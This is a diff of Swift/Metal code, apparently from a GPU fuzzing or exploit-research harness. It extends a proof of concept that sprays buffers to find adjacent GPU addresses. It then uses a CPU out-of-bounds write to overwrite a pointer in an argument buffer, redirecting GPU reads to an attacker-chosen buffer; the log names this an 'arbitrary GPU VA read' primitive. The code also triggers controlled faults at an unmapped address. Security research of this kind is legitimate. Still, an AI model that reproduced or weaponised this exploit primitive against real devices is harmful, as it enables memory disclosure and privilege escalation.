@@ -3041,15 +3041,20 @@ func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
         let BUF_LEN = 4096
         let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000
 
-        // sentinelBuf: filled 0xBB — GPU reads from here in the valid baseline case
+        // sentinelBuf: 0xBB fill — baseline "safe" source the GPU is supposed to read
+        // targetBuf:  0xCC fill — "secret" source we redirect the GPU to via OOB
         guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
               let resultBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
-            step("✗ sentinel/result alloc"); completion(); return
+            step("✗ sentinel/target/result alloc"); completion(); return
         }
         sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
+        targetBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xCC, count: BUF_LEN)
         resultBuf.contents().initializeMemory(as: UInt8.self, repeating: 0, count: BUF_LEN)
-        let sentVA = sentinelBuf.gpuAddress
+        let sentVA   = sentinelBuf.gpuAddress
+        let targetVA = targetBuf.gpuAddress
         step("sentinelBuf VA=0x\(String(sentVA, radix: 16))")
+        step("targetBuf   VA=0x\(String(targetVA, radix: 16))")
 
         // Spray: find lo with lo.gpuAddress + BUF_LEN = nextGPUVA (adjacent GPU VA slot)
         var loRef: MTLBuffer?
@@ -3108,14 +3113,15 @@ func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
         }
         step("✓ compute PSO (probe kernel) ready")
 
-        func execProbe(markSentinel: Bool) -> (Bool, String) {
+        func execProbe(useRes: MTLBuffer?) -> (Bool, String) {
+            resultBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xEE, count: 16)
             guard let q   = device.makeCommandQueue(),
                   let cb  = q.makeCommandBuffer(),
                   let enc = cb.makeComputeCommandEncoder() else { return (false, "no encoder") }
             enc.setComputePipelineState(pso)
             enc.setBuffer(hi,        offset: 0, index: 0)
             enc.setBuffer(resultBuf, offset: 0, index: 1)
-            if markSentinel { enc.useResource(sentinelBuf, usage: .read) }
+            if let r = useRes { enc.useResource(r, usage: .read) }
             let t = MTLSize(width: 1, height: 1, depth: 1)
             enc.dispatchThreads(t, threadsPerThreadgroup: t)
             enc.endEncoding()
@@ -3127,35 +3133,42 @@ func runArgBufCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
             return (false, "✓ out[0]=0x\(String(out, radix: 16))")
         }
 
-        // ── Step 1: baseline — write sentVA into hi[0] directly, GPU reads sentinelBuf ──
-        step("── step 1: hi[0]=sentVA direct write, GPU→sentinelBuf (baseline) ──")
+        // ── Step 1: baseline — hi[0]=sentVA direct, GPU→sentinelBuf (0xBB) ──
+        step("── step 1: hi[0]=sentVA (direct), GPU should read sentinelBuf (0xBB) ──")
         hi.contents().assumingMemoryBound(to: UInt64.self)[0] = sentVA
-        let (f1, s1) = execProbe(markSentinel: true)
-        step("  \(s1)")
-        let sentVal = sentinelBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
-        step("  sentinelBuf[0]=0x\(String(sentVal, radix: 16))")
+        let (f1, s1) = execProbe(useRes: sentinelBuf)
+        step("  \(s1)  \(f1 ? "" : "(expect 0xBBBBBBBBBBBBBBBB)")")
 
-        // ── Step 2: OOB corrupt — lo OOB write puts canaryVA into hi[0] ──
-        step("── step 2: OOB lo→hi[0]=canaryVA=0x\(String(canaryVA, radix: 16)) ──")
-        oobWrite8(0, canaryVA)
-        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
-        let oobHit = hiGot == canaryVA
-        step("  hi[0] via direct read=0x\(String(hiGot, radix: 16)) \(oobHit ? "✓ OOB CONFIRMED" : "⚠ OOB MISS")")
-        let (f2, s2) = execProbe(markSentinel: false)
-        step("  \(s2)")
-        if f2 && oobHit {
-            step("  ★★★ CONTROLLED GPU FAULT: CPU OOB→hi[0]=canaryVA→GPU deref→page fault at 0x\(String(canaryVA, radix: 16))")
-        } else if !oobHit {
-            step("  ⚠ OOB miss — hi not CPU-adjacent to lo (allocator gap)")
+        // ── Step 2: OOB redirect to mapped targetBuf — lo OOB writes targetVA into hi[0] ──
+        // GPU should now read targetBuf (0xCC) instead of sentinelBuf (0xBB).
+        // This proves: CPU OOB write → GPU reads attacker-chosen mapped buffer.
+        step("── step 2: OOB lo→hi[0]=targetVA=0x\(String(targetVA,radix:16)) → GPU should read targetBuf (0xCC) ──")
+        oobWrite8(0, targetVA)
+        let hiGot2 = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("  hi[0]=0x\(String(hiGot2,radix:16)) \(hiGot2==targetVA ? "✓ OOB hit" : "⚠ OOB miss")")
+        let (f2, s2) = execProbe(useRes: targetBuf)
+        step("  \(s2)  \(f2 ? "" : "(expect 0xCCCCCCCCCCCCCCCC)")")
+        if !f2 && hiGot2==targetVA && s2.contains("cccc") {
+            step("  ★★★ GPU READ REDIRECT: CPU OOB→hi[0]=targetVA → GPU read targetBuf(0xCC) instead of sentinelBuf(0xBB)")
+            step("  ★ PRIMITIVE COMPLETE: arbitrary GPU VA read via CPU OOB write to argument buffer")
         }
 
-        // ── hi raw bytes at both offsets for verification ──
-        step("── lo+BUF_LEN[0..31] (OOB view of hi) ──")
-        var h = "  "
+        // ── Step 3: OOB to unmapped canaryVA — AGX returns 0 or faults ──
+        step("── step 3: OOB lo→hi[0]=canaryVA=0x\(String(canaryVA,radix:16)) (unmapped) ──")
+        oobWrite8(0, canaryVA)
+        let hiGot3 = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("  hi[0]=0x\(String(hiGot3,radix:16)) \(hiGot3==canaryVA ? "✓ OOB hit" : "⚠ OOB miss")")
+        let (f3, s3) = execProbe(useRes: nil)
+        step("  \(s3)")
+        if f3 { step("  ★ CONTROLLED GPU FAULT at canaryVA (fault propagated)") }
+        else   { step("  AGX safe-return: GPU returned 0 for unmapped VA (fault absorbed by GPU MMU)") }
+
+        // ── raw byte comparison ──
+        step("── lo+BUF_LEN[0..31] vs hi.contents()[0..31] ──")
+        var h = "  OOB: "
         for i in 0..<32 { h += String(format: "%02x ", loPtr[BUF_LEN+i]) }
         step(h)
-        step("── hi.contents()[0..31] (direct view) ──")
-        var h2 = "  "
+        var h2 = "  HI:  "
         for i in 0..<32 { h2 += String(format: "%02x ", hiPtr[i]) }
         step(h2)
 
